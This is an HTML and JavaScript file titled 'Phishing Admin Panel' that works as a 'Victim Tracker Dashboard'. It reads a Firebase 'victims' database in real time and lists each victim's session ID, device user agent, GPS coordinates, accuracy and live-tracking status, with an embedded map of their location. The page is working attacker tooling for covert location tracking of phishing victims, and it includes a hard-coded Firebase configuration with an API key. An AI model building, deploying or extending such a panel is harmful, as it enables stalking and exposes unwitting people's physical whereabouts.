<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Admin Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { 
            text-align: center; 
            color: white; 
            margin-bottom: 30px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px; 
            margin-bottom: 30px;
        }
        .stat-card { 
            background: rgba(255,255,255,0.95); 
            padding: 20px; 
            border-radius: 12px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .victims-grid { 
            background: rgba(255,255,255,0.95); 
            border-radius: 12px; 
            padding: 20px; 
            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #eee; }
        th { background: #667eea; color: white; font-weight: 600; }
        .lat-long { font-family: monospace; font-weight: bold; color: #d63384; }
        .coords { 
            cursor: pointer; 
            padding: 4px 8px; 
            background: #e3f2fd; 
            border-radius: 4px; 
            display: inline-block;
            margin: 2px;
        }
        .coords:hover { background: #bbdefb; }
        .map-container { 
            height: 400px; 
            background: #f0f0f0; 
            border-radius: 8px; 
            margin: 20px 0;
            overflow: hidden;
        }
        .refresh-btn { 
            background: #28a745; 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 16px;
            margin: 10px;
        }
        .refresh-btn:hover { background: #218838; }
        @media (max-width: 768px) {
            .stats { grid-template-columns: 1fr; }
            table { font-size: 12px; }
            th, td { padding: 8px 4px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Victim Tracker Dashboard</h1>
            <p>Real-time GPS tracking & victim management</p>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="totalVictims">0</div>
                <div>Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="gpsCaptured">0</div>
                <div>GPS Captured</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="liveVictims">0</div>
                <div>Live Tracking</div>
            </div>
        </div>

        <button class="refresh-btn" onclick="refreshData()">🔄 Refresh Data</button>
        
        <div class="map-container" id="mapContainer">
            <div style="padding: 20px; text-align: center; color: #666;">
                Click on victim coordinates to see location on map
            </div>
        </div>

        <div class="victims-grid">
            <table id="victimsTable">
                <thead>
                    <tr>
                        <th>Session ID</th>
                        <th>Time</th>
                        <th>Device</th>
                        <th>GPS Location</th>
                        <th>Accuracy</th>
                        <th>Status</th>
                        <th>Map</th>
                    </tr>
                </thead>
                <tbody id="victimsBody"></tbody>
            </table>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
        import { getDatabase, ref, onValue } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';

        const firebaseConfig = {
            apiKey: "AIzaSyDNAcbechPRfrWSpxkZHKsksnr_hS88XdU",
            authDomain: "ai-studio-applet-webapp-2b6f9.firebaseapp.com",
            databaseURL: "https://ai-studio-applet-webapp-2b6f9-default-rtdb.firebaseio.com",
            projectId: "ai-studio-applet-webapp-2b6f9",
            storageBucket: "ai-studio-applet-webapp-2b6f9.firebasestorage.app",
            messagingSenderId: "594142136198",
            appId: "1:594142136198:web:2cd1ff68a43efefebd0e07"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const victimsRef = ref(db, 'victims');

        let victimsData = {};

        // Real-time listener
        onValue(victimsRef, (snapshot) => {
            victimsData = snapshot.val() || {};
            updateDashboard();
        });

        function updateDashboard() {
            const victims = Object.values(victimsData).filter(v => v);
            const gpsVictims = victims.filter(v => v.gps && !v.gps.error);
            const liveVictims = victims.filter(v => 
                v.gps && v.gps.timestamp > Date.now() - 60000 // Active in last minute
            );

            // Update stats
            document.getElementById('totalVictims').textContent = victims.length;
            document.getElementById('gpsCaptured').textContent = gpsVictims.length;
            document.getElementById('liveVictims').textContent = liveVictims.length;

            // Update table
            const tbody = document.getElementById('victimsBody');
            tbody.innerHTML = '';

            victims.forEach(victim => {
                const sessionId = Object.keys(victimsData).find(key => victimsData[key] === victim);
                const gps = victim.gps || {};
                const basic = victim.basic || {};
                
                const row = tbody.insertRow();
                row.innerHTML = `
                    <td><strong>${sessionId || 'N/A'}</strong></td>
                    <td>${new Date(gps.timestamp || basic.timestamp || 0).toLocaleString()}</td>
                    <td>${basic.userAgent ? basic.userAgent.substring(0, 50) + '...' : 'Unknown'}</td>
                    <td>
                        ${gps.latitude ? 
                            `<span class="coords" onclick="showMap(${gps.latitude}, ${gps.longitude})">
                                ${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}
                            </span>` : 
                            (gps.error ? `<span style="color: orange;">${gps.error}</span>` : 'No GPS')
                        }
                    </td>
                    <td>${gps.accuracy ? gps.accuracy.toFixed(0) + 'm' : 'N/A'}</td>
                    <td>
                        ${gps.timestamp > Date.now() - 60000 ? 
                            '<span style="color: green;">🟢 LIVE</span>' : 
                            (gps.latitude ? '<span style="color: orange;">🟡 Offline</span>' : '<span style="color: red;">🔴 No GPS</span>')
                        }
                    </td>
                    <td>
                        ${gps.latitude ? 
                            `<button onclick="showMap(${gps.latitude}, ${gps.longitude})" 
                                     style="padding: 4px 8px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">
                                🗺️ Map
                            </button>` : 'N/A'
                        }
                    </td>
                `;
            });
        }

        function showMap(lat, lng) {
            const mapUrl = `https://www.google.com/maps?q=${lat},${lng}&ll=${lat},${lng}&z=18&t=h&hl=en`;
            const mapContainer = document.getElementById('mapContainer');
            mapContainer.innerHTML = `
                <iframe 
                    width="100%" 
                    height="400" 
                    frameborder="0" 
                    style="border:0" 
                    src="${mapUrl}" 
                    allowfullscreen>
                </iframe>
                <p style="text-align: center; margin: 10px 0;">
                    <a href="${mapUrl}" target="_blank" style="color: #007bff;">Open in Google Maps</a>
                </p>
            `;
        }

        function refreshData() {
            updateDashboard();
        }

        // Initial load
        updateDashboard();
    </script>
</body>
</html>
